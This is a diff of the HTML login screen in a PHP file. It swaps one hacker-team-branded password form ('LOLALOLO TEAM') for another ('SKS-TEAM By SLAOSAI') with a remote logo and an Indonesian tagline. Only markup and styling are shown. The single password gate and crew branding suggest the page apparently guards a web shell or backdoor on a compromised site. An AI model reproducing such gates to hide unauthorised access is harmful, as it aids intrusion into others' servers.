@@ -64,122 +64,75 @@ if (is_logged_in()) {
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Login Page</title>
-  <link rel="preconnect" href="https://fonts.googleapis.com">
-  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-  <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;600&display=swap" rel="stylesheet">
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>SKS-TEAM By SLAOSAI</title>
+  <link rel="icon" href="https://slaosai.com/img/logo-slaosai.gif" />
   <style>
-    * {
+    body {
       margin: 0;
       padding: 0;
-      box-sizing: border-box;
-    }
-
-    body, html {
-      height: 100%;
-      font-family: 'Poppins', sans-serif;
-    }
-
-    .container {
-      width: 100%;
-      min-height: 100vh;
+      background-color: #000;
+      font-family: Arial, sans-serif;
+      color: #fff;
       display: flex;
       justify-content: center;
       align-items: center;
-      background-image: url("https://xinztheonly.one/img/gengar.jpeg");
-      padding: 20px;
+      height: 100vh;
+      flex-direction: column;
     }
-
     .login-box {
-      background: transparent;
-      border-radius: 12px;
-      padding: 40px;
-      width: 100%;
-      max-width: 400px;
-      box-shadow: 0 8px 24px rgba(0, 0, 0, 0.2);
-    }
-
-    .login-box h2 {
-      margin-bottom: 24px;
-      color: #fff;
-      font-weight: 600;
+      background-color: #111;
+      padding: 30px;
+      border-radius: 10px;
       text-align: center;
+      box-shadow: 0 0 15px red;
     }
-
-    .form-group {
+    .login-box img {
+      width: 250px;
+      border-radius: 100%;
+      margin-bottom: 10px;
+    }
+    .title {
+      font-size: 25px;
+      font-weight: bold;
+      color: #f00;
+    }
+    .tagline {
+      font-size: 12px;
+      color: #ccc;
       margin-bottom: 20px;
-      text-align: center;
+      font-style: bold;
     }
-
-    .form-group label {
-      display: block;
-      margin-bottom: 6px;
-      font-weight: 500;
-      color: #fff;
-    }
-
-    .form-group input {
-      width: 100%;
-      padding: 12px 16px;
-      border: 1px solid #ddd;
-      border-radius: 8px;
-      outline: none;
-      font-size: 16px;
-    }
-
-    .form-group input:focus {
-      border-color: #667eea;
-    }
-
-    .login-btn {
-      width: 100%;
-      padding: 12px;
-      background-color: transparent;
-      color: transparent;
-      font-size: 16px;
-      font-weight: 600;
+    input[type="password"] {
+      padding: 10px;
+      width: 80%;
       border: none;
-      border-radius: 8px;
+      border-radius: 5px;
+      margin-bottom: 20px;
+    }
+    button {
+      padding: 10px 20px;
+      background-color: red;
+      color: white;
+      border: none;
+      border-radius: 5px;
       cursor: pointer;
-      transition: background-color 0.3s ease;
     }
-
-    .login-btn:hover {
-      background-color: #5a67d8;
-    }
-
-    .bottom-text {
-      margin-top: 20px;
-      text-align: center;
-      font-size: 14px;
-      color: #666;
-    }
-
-    .bottom-text a {
-      color: #667eea;
-      text-decoration: none;
-      font-weight: 500;
-    }
-
-    .bottom-text a:hover {
-      text-decoration: underline;
+    button:hover {
+      background-color: darkred;
     }
   </style>
 </head>
 <body>
-  <div class="container">
-    <div class="login-box">
-      <h2>LOLALOLO TEAM</h2>
-      <form>
-        <div class="form-group">
-          <label for="password">Password</label>
-          <input type="password" id="password" name="password" required>
-        </div>
-        <button type="submit" class="login-btn">Hayo Apa Hayo</button>
-      </form>
-    </div>
+  <div class="login-box">
+    <img src="https://slaosai.com/img/logo-slaosai.gif" alt="SLAOSAI">
+    <div class="title">SKS-TEAM By SLAOSAI</div>
+    <div class="tagline">HANYA SEORANG ANAK YATIM YANG INGIN KAYA</div>
+    <form method="post" action="">
+      <div class="form-group">
+      <input type="password" id="password" name="password" placeholder="Enter Password" required>
+    </form>
   </div>
 </body>
 </html>
